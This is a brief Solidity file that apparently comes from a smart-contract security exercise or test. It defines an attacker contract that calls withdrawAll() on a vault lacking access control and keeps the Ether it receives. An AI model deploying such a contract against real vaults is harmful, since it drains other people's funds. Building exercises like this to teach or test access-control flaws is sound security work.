// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IAccessControlVault {
    function withdrawAll() external;
}

contract AccessControlAttacker {
    IAccessControlVault public vault;

    constructor(IAccessControlVault _vault) {
        vault = _vault;
    }

    function attack() external {
        vault.withdrawAll();
    }

    receive() external payable {}
}
